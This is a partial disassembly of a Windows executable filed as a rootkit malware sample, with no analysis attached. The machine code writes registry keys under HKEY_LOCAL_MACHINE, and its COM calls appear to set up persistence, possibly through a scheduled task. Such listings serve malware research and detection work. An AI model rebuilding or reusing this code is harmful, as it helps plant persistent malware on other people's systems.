
malware_samples/rootkit/22ee7b8104599b47313195598ffc34aafd6a6552dcce0e7b3232ced3a90ac9a4.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	40 53                	rex push %rbx
   140001002:	48 83 ec 40          	sub    $0x40,%rsp
   140001006:	48 8b 05 f3 5f 01 00 	mov    0x15ff3(%rip),%rax        # 0x140017000
   14000100d:	48 33 c4             	xor    %rsp,%rax
   140001010:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001015:	33 c9                	xor    %ecx,%ecx
   140001017:	e8 b4 29 00 00       	call   0x1400039d0
   14000101c:	48 8b c8             	mov    %rax,%rcx
   14000101f:	e8 94 29 00 00       	call   0x1400039b8
   140001024:	4c 8d 05 c5 36 01 00 	lea    0x136c5(%rip),%r8        # 0x1400146f0
   14000102b:	ba 65 00 00 00       	mov    $0x65,%edx
   140001030:	33 c9                	xor    %ecx,%ecx
   140001032:	ff 15 30 c0 00 00    	call   *0xc030(%rip)        # 0x14000d068
   140001038:	48 8b d8             	mov    %rax,%rbx
   14000103b:	48 85 c0             	test   %rax,%rax
   14000103e:	0f 84 83 01 00 00    	je     0x1400011c7
   140001044:	48 8b d0             	mov    %rax,%rdx
   140001047:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   14000104c:	33 c9                	xor    %ecx,%ecx
   14000104e:	ff 15 34 c0 00 00    	call   *0xc034(%rip)        # 0x14000d088
   140001054:	8b f8                	mov    %eax,%edi
   140001056:	85 c0                	test   %eax,%eax
   140001058:	0f 84 64 01 00 00    	je     0x1400011c2
   14000105e:	48 8b d3             	mov    %rbx,%rdx
   140001061:	33 c9                	xor    %ecx,%ecx
   140001063:	ff 15 c7 bf 00 00    	call   *0xbfc7(%rip)        # 0x14000d030
   140001069:	48 85 c0             	test   %rax,%rax
   14000106c:	0f 84 50 01 00 00    	je     0x1400011c2
   140001072:	48 8b c8             	mov    %rax,%rcx
   140001075:	ff 15 a5 bf 00 00    	call   *0xbfa5(%rip)        # 0x14000d020
   14000107b:	41 b9 3f 02 0f 00    	mov    $0xf023f,%r9d
   140001081:	48 8d 15 70 36 01 00 	lea    0x13670(%rip),%rdx        # 0x1400146f8
   140001088:	48 8b d8             	mov    %rax,%rbx
   14000108b:	45 33 c0             	xor    %r8d,%r8d
   14000108e:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140001093:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000109a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000109f:	ff 15 63 bf 00 00    	call   *0xbf63(%rip)        # 0x14000d008
   1400010a5:	85 c0                	test   %eax,%eax
   1400010a7:	0f 85 15 01 00 00    	jne    0x1400011c2
   1400010ad:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400010b2:	44 8d 48 03          	lea    0x3(%rax),%r9d
   1400010b6:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   1400010ba:	48 8d 15 4f 36 01 00 	lea    0x1364f(%rip),%rdx        # 0x140014710
   1400010c1:	45 33 c0             	xor    %r8d,%r8d
   1400010c4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400010c9:	ff 15 31 bf 00 00    	call   *0xbf31(%rip)        # 0x14000d000
   1400010cf:	85 c0                	test   %eax,%eax
   1400010d1:	0f 85 eb 00 00 00    	jne    0x1400011c2
   1400010d7:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400010dc:	41 b9 3f 01 0f 00    	mov    $0xf013f,%r9d
   1400010e2:	45 33 c0             	xor    %r8d,%r8d
   1400010e5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400010ea:	48 8d 15 07 36 01 00 	lea    0x13607(%rip),%rdx        # 0x1400146f8
   1400010f1:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   1400010f8:	ff 15 0a bf 00 00    	call   *0xbf0a(%rip)        # 0x14000d008
   1400010fe:	85 c0                	test   %eax,%eax
   140001100:	0f 85 bc 00 00 00    	jne    0x1400011c2
   140001106:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000110b:	44 8d 48 03          	lea    0x3(%rax),%r9d
   14000110f:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140001113:	48 8d 15 f6 35 01 00 	lea    0x135f6(%rip),%rdx        # 0x140014710
   14000111a:	45 33 c0             	xor    %r8d,%r8d
   14000111d:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001122:	ff 15 d8 be 00 00    	call   *0xbed8(%rip)        # 0x14000d000
   140001128:	85 c0                	test   %eax,%eax
   14000112a:	0f 85 92 00 00 00    	jne    0x1400011c2
   140001130:	b9 00 20 00 00       	mov    $0x2000,%ecx
   140001135:	e8 66 04 00 00       	call   0x1400015a0
   14000113a:	48 8d 15 0f 3b 01 00 	lea    0x13b0f(%rip),%rdx        # 0x140014c50
   140001141:	48 8b c8             	mov    %rax,%rcx
   140001144:	ff 15 46 bf 00 00    	call   *0xbf46(%rip)        # 0x14000d090
   14000114a:	b9 00 20 00 00       	mov    $0x2000,%ecx
   14000114f:	e8 4c 04 00 00       	call   0x1400015a0
   140001154:	48 8d 15 f5 3a 01 00 	lea    0x13af5(%rip),%rdx        # 0x140014c50
   14000115b:	48 8b c8             	mov    %rax,%rcx
   14000115e:	ff 15 2c bf 00 00    	call   *0xbf2c(%rip)        # 0x14000d090
   140001164:	48 8d 0d c5 35 01 00 	lea    0x135c5(%rip),%rcx        # 0x140014730
   14000116b:	e8 50 03 00 00       	call   0x1400014c0
   140001170:	48 8d 15 59 3a 01 00 	lea    0x13a59(%rip),%rdx        # 0x140014bd0
   140001177:	48 8d 0d b2 35 01 00 	lea    0x135b2(%rip),%rcx        # 0x140014730
   14000117e:	e8 5d 00 00 00       	call   0x1400011e0
   140001183:	85 c0                	test   %eax,%eax
   140001185:	74 0c                	je     0x140001193
   140001187:	48 8d 0d a2 35 01 00 	lea    0x135a2(%rip),%rcx        # 0x140014730
   14000118e:	e8 4d 02 00 00       	call   0x1400013e0
   140001193:	48 8d 0d 96 3a 01 00 	lea    0x13a96(%rip),%rcx        # 0x140014c30
   14000119a:	e8 21 03 00 00       	call   0x1400014c0
   14000119f:	48 8d 15 82 3a 01 00 	lea    0x13a82(%rip),%rdx        # 0x140014c28
   1400011a6:	48 8d 0d 83 3a 01 00 	lea    0x13a83(%rip),%rcx        # 0x140014c30
   1400011ad:	e8 2e 00 00 00       	call   0x1400011e0
   1400011b2:	85 c0                	test   %eax,%eax
   1400011b4:	74 0c                	je     0x1400011c2
   1400011b6:	48 8d 0d 73 3a 01 00 	lea    0x13a73(%rip),%rcx        # 0x140014c30
   1400011bd:	e8 1e 02 00 00       	call   0x1400013e0
   1400011c2:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400011c7:	33 c0                	xor    %eax,%eax
   1400011c9:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400011ce:	48 33 cc             	xor    %rsp,%rcx
   1400011d1:	e8 aa 03 00 00       	call   0x140001580
   1400011d6:	48 83 c4 40          	add    $0x40,%rsp
   1400011da:	5b                   	pop    %rbx
   1400011db:	c3                   	ret
   1400011dc:	cc                   	int3
   1400011dd:	cc                   	int3
   1400011de:	cc                   	int3
   1400011df:	cc                   	int3
   1400011e0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400011e5:	55                   	push   %rbp
   1400011e6:	56                   	push   %rsi
   1400011e7:	57                   	push   %rdi
   1400011e8:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   1400011ed:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400011f4:	48 8b 05 05 5e 01 00 	mov    0x15e05(%rip),%rax        # 0x140017000
   1400011fb:	48 33 c4             	xor    %rsp,%rax
   1400011fe:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   140001202:	48 8b f1             	mov    %rcx,%rsi
   140001205:	48 8b fa             	mov    %rdx,%rdi
   140001208:	33 c9                	xor    %ecx,%ecx
   14000120a:	33 db                	xor    %ebx,%ebx
   14000120c:	ff 15 46 c0 00 00    	call   *0xc046(%rip)        # 0x14000d258
   140001212:	85 c0                	test   %eax,%eax
   140001214:	0f 88 a1 01 00 00    	js     0x1400013bb
   14000121a:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000121e:	4c 89 b4 24 c0 00 00 	mov    %r14,0xc0(%rsp)
   140001225:	00 
   140001226:	41 be 01 00 00 00    	mov    $0x1,%r14d
   14000122c:	48 89 5d ff          	mov    %rbx,-0x1(%rbp)
   140001230:	45 8b c6             	mov    %r14d,%r8d
   140001233:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001238:	4c 8d 0d 41 3e 01 00 	lea    0x13e41(%rip),%r9        # 0x140015080
   14000123f:	33 d2                	xor    %edx,%edx
   140001241:	48 8d 0d 28 3e 01 00 	lea    0x13e28(%rip),%rcx        # 0x140015070
   140001248:	ff 15 1a c0 00 00    	call   *0xc01a(%rip)        # 0x14000d268
   14000124e:	85 c0                	test   %eax,%eax
   140001250:	0f 88 57 01 00 00    	js     0x1400013ad
   140001256:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   14000125a:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   14000125e:	48 89 5d e7          	mov    %rbx,-0x19(%rbp)
   140001262:	4c 8d 0d 27 3e 01 00 	lea    0x13e27(%rip),%r9        # 0x140015090
   140001269:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000126e:	4c 8d 05 eb 3d 01 00 	lea    0x13deb(%rip),%r8        # 0x140015060
   140001275:	48 8b d6             	mov    %rsi,%rdx
   140001278:	48 8b 01             	mov    (%rcx),%rax
   14000127b:	ff 50 40             	call   *0x40(%rax)
   14000127e:	85 c0                	test   %eax,%eax
   140001280:	0f 88 1d 01 00 00    	js     0x1400013a3
   140001286:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   14000128a:	48 8b d7             	mov    %rdi,%rdx
   14000128d:	48 8b 01             	mov    (%rcx),%rax
   140001290:	ff 90 20 01 00 00    	call   *0x120(%rax)
   140001296:	85 c0                	test   %eax,%eax
   140001298:	0f 88 fb 00 00 00    	js     0x140001399
   14000129e:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   1400012a2:	48 8d 15 07 39 01 00 	lea    0x13907(%rip),%rdx        # 0x140014bb0
   1400012a9:	48 8b 01             	mov    (%rcx),%rax
   1400012ac:	ff 90 00 01 00 00    	call   *0x100(%rax)
   1400012b2:	85 c0                	test   %eax,%eax
   1400012b4:	0f 88 df 00 00 00    	js     0x140001399
   1400012ba:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   1400012be:	48 8d 15 8b 34 01 00 	lea    0x1348b(%rip),%rdx        # 0x140014750
   1400012c5:	48 8b 01             	mov    (%rcx),%rax
   1400012c8:	ff 90 10 01 00 00    	call   *0x110(%rax)
   1400012ce:	85 c0                	test   %eax,%eax
   1400012d0:	0f 88 c3 00 00 00    	js     0x140001399
   1400012d6:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   1400012da:	48 8d 15 47 39 01 00 	lea    0x13947(%rip),%rdx        # 0x140014c28
   1400012e1:	45 33 c0             	xor    %r8d,%r8d
   1400012e4:	48 8b 01             	mov    (%rcx),%rax
   1400012e7:	ff 90 f0 00 00 00    	call   *0xf0(%rax)
   1400012ed:	85 c0                	test   %eax,%eax
   1400012ef:	0f 88 a4 00 00 00    	js     0x140001399
   1400012f5:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   1400012f9:	4c 8d 45 f7          	lea    -0x9(%rbp),%r8
   1400012fd:	48 89 5d f7          	mov    %rbx,-0x9(%rbp)
   140001301:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   140001305:	48 8b 01             	mov    (%rcx),%rax
   140001308:	ff 50 18             	call   *0x18(%rax)
   14000130b:	85 c0                	test   %eax,%eax
   14000130d:	0f 88 86 00 00 00    	js     0x140001399
   140001313:	48 8b 4d f7          	mov    -0x9(%rbp),%rcx
   140001317:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   14000131b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000131e:	b8 30 00 00 00       	mov    $0x30,%eax
   140001323:	0f 11 45 0f          	movups %xmm0,0xf(%rbp)
   140001327:	66 89 45 0f          	mov    %ax,0xf(%rbp)
   14000132b:	b8 d0 07 00 00       	mov    $0x7d0,%eax
   140001330:	0f 11 45 2f          	movups %xmm0,0x2f(%rbp)
   140001334:	66 89 45 13          	mov    %ax,0x13(%rbp)
   140001338:	0f 11 45 1f          	movups %xmm0,0x1f(%rbp)
   14000133c:	c7 45 2f 06 00 00 00 	movl   $0x6,0x2f(%rbp)
   140001343:	c7 45 15 01 00 01 00 	movl   $0x10001,0x15(%rbp)
   14000134a:	48 8b 01             	mov    (%rcx),%rax
   14000134d:	ff 50 18             	call   *0x18(%rax)
   140001350:	85 c0                	test   %eax,%eax
   140001352:	78 3b                	js     0x14000138f
   140001354:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   140001358:	4c 8d 45 ef          	lea    -0x11(%rbp),%r8
   14000135c:	48 89 5d ef          	mov    %rbx,-0x11(%rbp)
   140001360:	48 8d 15 d9 bf 00 00 	lea    0xbfd9(%rip),%rdx        # 0x14000d340
   140001367:	48 8b 01             	mov    (%rcx),%rax
   14000136a:	ff 10                	call   *(%rax)
   14000136c:	85 c0                	test   %eax,%eax
   14000136e:	78 1f                	js     0x14000138f
   140001370:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140001374:	45 8b c6             	mov    %r14d,%r8d
   140001377:	33 d2                	xor    %edx,%edx
   140001379:	48 8b 01             	mov    (%rcx),%rax
   14000137c:	ff 50 30             	call   *0x30(%rax)
   14000137f:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140001383:	85 c0                	test   %eax,%eax
   140001385:	41 0f 49 de          	cmovns %r14d,%ebx
   140001389:	48 8b 01             	mov    (%rcx),%rax
   14000138c:	ff 50 10             	call   *0x10(%rax)
   14000138f:	48 8b 4d f7          	mov    -0x9(%rbp),%rcx
   140001393:	48 8b 01             	mov    (%rcx),%rax
   140001396:	ff 50 10             	call   *0x10(%rax)
   140001399:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   14000139d:	48 8b 11             	mov    (%rcx),%rdx
   1400013a0:	ff 52 10             	call   *0x10(%rdx)
   1400013a3:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   1400013a7:	48 8b 11             	mov    (%rcx),%rdx
   1400013aa:	ff 52 10             	call   *0x10(%rdx)
   1400013ad:	ff 15 ad be 00 00    	call   *0xbead(%rip)        # 0x14000d260
   1400013b3:	4c 8b b4 24 c0 00 00 	mov    0xc0(%rsp),%r14
   1400013ba:	00 
   1400013bb:	8b c3                	mov    %ebx,%eax
   1400013bd:	48 8b 4d 3f          	mov    0x3f(%rbp),%rcx
   1400013c1:	48 33 cc             	xor    %rsp,%rcx
   1400013c4:	e8 b7 01 00 00       	call   0x140001580
   1400013c9:	48 8b 9c 24 c8 00 00 	mov    0xc8(%rsp),%rbx
   1400013d0:	00 
   1400013d1:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400013d8:	5f                   	pop    %rdi
   1400013d9:	5e                   	pop    %rsi
   1400013da:	5d                   	pop    %rbp
   1400013db:	c3                   	ret
   1400013dc:	cc                   	int3
   1400013dd:	cc                   	int3
   1400013de:	cc                   	int3
   1400013df:	cc                   	int3
   1400013e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400013e5:	57                   	push   %rdi
   1400013e6:	48 83 ec 50          	sub    $0x50,%rsp
   1400013ea:	48 8b 05 0f 5c 01 00 	mov    0x15c0f(%rip),%rax        # 0x140017000
   1400013f1:	48 33 c4             	xor    %rsp,%rax
   1400013f4:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400013f9:	48 8b f9             	mov    %rcx,%rdi
   1400013fc:	33 db                	xor    %ebx,%ebx
   1400013fe:	33 c9                	xor    %ecx,%ecx
   140001400:	ff 15 52 be 00 00    	call   *0xbe52(%rip)        # 0x14000d258
   140001406:	85 c0                	test   %eax,%eax
   140001408:	0f 88 8a 00 00 00    	js     0x140001498
   14000140e:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140001413:	48 89 74 24 68       	mov    %rsi,0x68(%rsp)
   140001418:	be 01 00 00 00       	mov    $0x1,%esi
   14000141d:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140001422:	44 8b c6             	mov    %esi,%r8d
   140001425:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000142a:	4c 8d 0d 4f 3c 01 00 	lea    0x13c4f(%rip),%r9        # 0x140015080
   140001431:	33 d2                	xor    %edx,%edx
   140001433:	48 8d 0d 36 3c 01 00 	lea    0x13c36(%rip),%rcx        # 0x140015070
   14000143a:	ff 15 28 be 00 00    	call   *0xbe28(%rip)        # 0x14000d268
   140001440:	85 c0                	test   %eax,%eax
   140001442:	78 49                	js     0x14000148d
   140001444:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001449:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000144e:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001453:	4c 8d 05 36 3c 01 00 	lea    0x13c36(%rip),%r8        # 0x140015090
   14000145a:	48 8b d7             	mov    %rdi,%rdx
   14000145d:	48 8b 01             	mov    (%rcx),%rax
   140001460:	ff 50 30             	call   *0x30(%rax)
   140001463:	85 c0                	test   %eax,%eax
   140001465:	78 1b                	js     0x140001482
   140001467:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000146c:	48 8b 01             	mov    (%rcx),%rax
   14000146f:	ff 50 60             	call   *0x60(%rax)
   140001472:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001477:	85 c0                	test   %eax,%eax
   140001479:	0f 49 de             	cmovns %esi,%ebx
   14000147c:	48 8b 11             	mov    (%rcx),%rdx
   14000147f:	ff 52 10             	call   *0x10(%rdx)
   140001482:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001487:	48 8b 11             	mov    (%rcx),%rdx
   14000148a:	ff 52 10             	call   *0x10(%rdx)
   14000148d:	ff 15 cd bd 00 00    	call   *0xbdcd(%rip)        # 0x14000d260
   140001493:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140001498:	8b c3                	mov    %ebx,%eax
   14000149a:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000149f:	48 33 cc             	xor    %rsp,%rcx
   1400014a2:	e8 d9 00 00 00       	call   0x140001580
   1400014a7:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400014ac:	48 83 c4 50          	add    $0x50,%rsp
   1400014b0:	5f                   	pop    %rdi
   1400014b1:	c3                   	ret
   1400014b2:	cc                   	int3
   1400014b3:	cc                   	int3
   1400014b4:	cc                   	int3
   1400014b5:	cc                   	int3
   1400014b6:	cc                   	int3
   1400014b7:	cc                   	int3
   1400014b8:	cc                   	int3
   1400014b9:	cc                   	int3
   1400014ba:	cc                   	int3
   1400014bb:	cc                   	int3
   1400014bc:	cc                   	int3
   1400014bd:	cc                   	int3
   1400014be:	cc                   	int3
   1400014bf:	cc                   	int3
   1400014c0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400014c5:	57                   	push   %rdi
   1400014c6:	48 83 ec 40          	sub    $0x40,%rsp
   1400014ca:	48 8b 05 2f 5b 01 00 	mov    0x15b2f(%rip),%rax        # 0x140017000
   1400014d1:	48 33 c4             	xor    %rsp,%rax
   1400014d4:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400014d9:	48 8b f9             	mov    %rcx,%rdi
   1400014dc:	33 db                	xor    %ebx,%ebx
   1400014de:	33 c9                	xor    %ecx,%ecx
   1400014e0:	ff 15 72 bd 00 00    	call   *0xbd72(%rip)        # 0x14000d258
   1400014e6:	85 c0                	test   %eax,%eax
   1400014e8:	78 60                	js     0x14000154a
   1400014ea:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400014ef:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   1400014f4:	be 01 00 00 00       	mov    $0x1,%esi
   1400014f9:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400014fe:	44 8b c6             	mov    %esi,%r8d
   140001501:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001506:	4c 8d 0d 73 3b 01 00 	lea    0x13b73(%rip),%r9        # 0x140015080
   14000150d:	33 d2                	xor    %edx,%edx
   14000150f:	48 8d 0d 5a 3b 01 00 	lea    0x13b5a(%rip),%rcx        # 0x140015070
   140001516:	ff 15 4c bd 00 00    	call   *0xbd4c(%rip)        # 0x14000d268
   14000151c:	85 c0                	test   %eax,%eax
   14000151e:	78 1f                	js     0x14000153f
   140001520:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001525:	48 8b d7             	mov    %rdi,%rdx
   140001528:	4c 8b 01             	mov    (%rcx),%r8
   14000152b:	41 ff 50 38          	call   *0x38(%r8)
   14000152f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001534:	85 c0                	test   %eax,%eax
   140001536:	0f 49 de             	cmovns %esi,%ebx
   140001539:	48 8b 11             	mov    (%rcx),%rdx
   14000153c:	ff 52 10             	call   *0x10(%rdx)
   14000153f:	ff 15 1b bd 00 00    	call   *0xbd1b(%rip)        # 0x14000d260
   140001545:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000154a:	8b c3                	mov    %ebx,%eax
   14000154c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001551:	48 33 cc             	xor    %rsp,%rcx
   140001554:	e8 27 00 00 00       	call   0x140001580
   140001559:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000155e:	48 83 c4 40          	add    $0x40,%rsp
   140001562:	5f                   	pop    %rdi
   140001563:	c3                   	ret
   140001564:	cc                   	int3
   140001565:	cc                   	int3
   140001566:	cc                   	int3
   140001567:	cc                   	int3
   140001568:	cc                   	int3
   140001569:	cc                   	int3
   14000156a:	cc                   	int3
   14000156b:	cc                   	int3
   14000156c:	cc                   	int3
   14000156d:	cc                   	int3
   14000156e:	cc                   	int3
   14000156f:	cc                   	int3
   140001570:	cc                   	int3
   140001571:	cc                   	int3
   140001572:	cc                   	int3
   140001573:	cc                   	int3
   140001574:	cc                   	int3
   140001575:	cc                   	int3
   140001576:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000157d:	00 00 00 
   140001580:	48 3b 0d 79 5a 01 00 	cmp    0x15a79(%rip),%rcx        # 0x140017000
   140001587:	75 10                	jne    0x140001599
   140001589:	48 c1 c1 10          	rol    $0x10,%rcx
   14000158d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001592:	75 01                	jne    0x140001595
   140001594:	c3                   	ret
   140001595:	48 c1 c9 10          	ror    $0x10,%rcx
   140001599:	e9 ee 02 00 00       	jmp    0x14000188c
   14000159e:	cc                   	int3
   14000159f:	cc                   	int3
   1400015a0:	e9 03 00 00 00       	jmp    0x1400015a8
   1400015a5:	cc                   	int3
   1400015a6:	cc                   	int3
   1400015a7:	cc                   	int3
   1400015a8:	40 53                	rex push %rbx
   1400015aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400015ae:	48 8b d9             	mov    %rcx,%rbx
   1400015b1:	eb 0f                	jmp    0x1400015c2
   1400015b3:	48 8b cb             	mov    %rbx,%rcx
   1400015b6:	e8 75 25 00 00       	call   0x140003b30
   1400015bb:	85 c0                	test   %eax,%eax
   1400015bd:	74 13                	je     0x1400015d2
   1400015bf:	48 8b cb             	mov    %rbx,%rcx
   1400015c2:	e8 cd 25 00 00       	call   0x140003b94
   1400015c7:	48 85 c0             	test   %rax,%rax
   1400015ca:	74 e7                	je     0x1400015b3
   1400015cc:	48 83 c4 20          	add    $0x20,%rsp
   1400015d0:	5b                   	pop    %rbx
   1400015d1:	c3                   	ret
   1400015d2:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   1400015d6:	74 06                	je     0x1400015de
   1400015d8:	e8 63 06 00 00       	call   0x140001c40
   1400015dd:	cc                   	int3
   1400015de:	e8 7d 06 00 00       	call   0x140001c60
   1400015e3:	cc                   	int3
   1400015e4:	e9 0b 05 00 00       	jmp    0x140001af4
   1400015e9:	cc                   	int3
   1400015ea:	cc                   	int3
   1400015eb:	cc                   	int3
   1400015ec:	40 53                	rex push %rbx
   1400015ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400015f2:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400015f7:	e8 2c 27 00 00       	call   0x140003d28
   1400015fc:	e8 9b 09 00 00       	call   0x140001f9c
   140001601:	8b c8                	mov    %eax,%ecx
   140001603:	e8 7c 31 00 00       	call   0x140004784
   140001608:	e8 83 09 00 00       	call   0x140001f90
   14000160d:	8b d8                	mov    %eax,%ebx
   14000160f:	e8 fc 32 00 00       	call   0x140004910
   140001614:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001619:	89 18                	mov    %ebx,(%rax)
   14000161b:	e8 fc 06 00 00       	call   0x140001d1c
   140001620:	84 c0                	test   %al,%al
   140001622:	74 73                	je     0x140001697
   140001624:	e8 33 0c 00 00       	call   0x14000225c
   140001629:	48 8d 0d 68 0c 00 00 	lea    0xc68(%rip),%rcx        # 0x140002298
   140001630:	e8 97 08 00 00       	call   0x140001ecc
   140001635:	e8 5a 09 00 00       	call   0x140001f94
   14000163a:	8b c8                	mov    %eax,%ecx
   14000163c:	e8 8f 29 00 00       	call   0x140003fd0
   140001641:	85 c0                	test   %eax,%eax
   140001643:	75 52                	jne    0x140001697
   140001645:	e8 5a 09 00 00       	call   0x140001fa4
   14000164a:	e8 99 09 00 00       	call   0x140001fe8
   14000164f:	85 c0                	test   %eax,%eax
   140001651:	74 0c                	je     0x14000165f
   140001653:	48 8d 0d 36 09 00 00 	lea    0x936(%rip),%rcx        # 0x140001f90
   14000165a:	e8 29 27 00 00       	call   0x140003d88
   14000165f:	e8 54 09 00 00       	call   0x140001fb8
   140001664:	e8 4f 09 00 00       	call   0x140001fb8
   140001669:	e8 22 09 00 00       	call   0x140001f90
   14000166e:	8b c8                	mov    %eax,%ecx
   140001670:	e8 fb 31 00 00       	call   0x140004870
   140001675:	e8 3a 09 00 00       	call   0x140001fb4
   14000167a:	84 c0                	test   %al,%al
   14000167c:	74 05                	je     0x140001683
   14000167e:	e8 fd 2c 00 00       	call   0x140004380
   140001683:	e8 08 09 00 00       	call   0x140001f90
   140001688:	e8 07 0b 00 00       	call   0x140002194
   14000168d:	85 c0                	test   %eax,%eax
   14000168f:	75 06                	jne    0x140001697
   140001691:	48 83 c4 20          	add    $0x20,%rsp
   140001695:	5b                   	pop    %rbx
   140001696:	c3                   	ret
   140001697:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000169c:	e8 6b 09 00 00       	call   0x14000200c
   1400016a1:	cc                   	int3
   1400016a2:	cc                   	int3
   1400016a3:	cc                   	int3
   1400016a4:	48 83 ec 28          	sub    $0x28,%rsp
   1400016a8:	e8 1f 09 00 00       	call   0x140001fcc
   1400016ad:	33 c0                	xor    %eax,%eax
   1400016af:	48 83 c4 28          	add    $0x28,%rsp
   1400016b3:	c3                   	ret
   1400016b4:	48 83 ec 28          	sub    $0x28,%rsp
   1400016b8:	e8 33 0b 00 00       	call   0x1400021f0
   1400016bd:	e8 ce 08 00 00       	call   0x140001f90
   1400016c2:	8b c8                	mov    %eax,%ecx
   1400016c4:	48 83 c4 28          	add    $0x28,%rsp
   1400016c8:	e9 17 32 00 00       	jmp    0x1400048e4
   1400016cd:	cc                   	int3
   1400016ce:	cc                   	int3
   1400016cf:	cc                   	int3
   1400016d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400016d5:	57                   	push   %rdi
   1400016d6:	48 83 ec 30          	sub    $0x30,%rsp
   1400016da:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400016df:	e8 ec 05 00 00       	call   0x140001cd0
   1400016e4:	84 c0                	test   %al,%al
   1400016e6:	0f 84 30 01 00 00    	je     0x14000181c
   1400016ec:	40 32 ff             	xor    %dil,%dil
   1400016ef:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   1400016f4:	e8 9b 05 00 00       	call   0x140001c94
   1400016f9:	8a d8                	mov    %al,%bl
   1400016fb:	8b 0d ff 68 01 00    	mov    0x168ff(%rip),%ecx        # 0x140018000
   140001701:	83 f9 01             	cmp    $0x1,%ecx
   140001704:	0f 84 1d 01 00 00    	je     0x140001827
   14000170a:	85 c9                	test   %ecx,%ecx
   14000170c:	75 4a                	jne    0x140001758
   14000170e:	c7 05 e8 68 01 00 01 	movl   $0x1,0x168e8(%rip)        # 0x140018000
   140001715:	00 00 00 
   140001718:	48 8d 15 e1 bb 00 00 	lea    0xbbe1(%rip),%rdx        # 0x14000d300
   14000171f:	48 8d 0d a2 bb 00 00 	lea    0xbba2(%rip),%rcx        # 0x14000d2c8
   140001726:	e8 31 2d 00 00       	call   0x14000445c
   14000172b:	85 c0                	test   %eax,%eax
   14000172d:	74 0a                	je     0x140001739
   14000172f:	b8 ff 00 00 00       	mov    $0xff,%eax
   140001734:	e9 d8 00 00 00       	jmp    0x140001811
   140001739:	48 8d 15 80 bb 00 00 	lea    0xbb80(%rip),%rdx        # 0x14000d2c0
   140001740:	48 8d 0d 69 bb 00 00 	lea    0xbb69(%rip),%rcx        # 0x14000d2b0
   140001747:	e8 ac 2c 00 00       	call   0x1400043f8
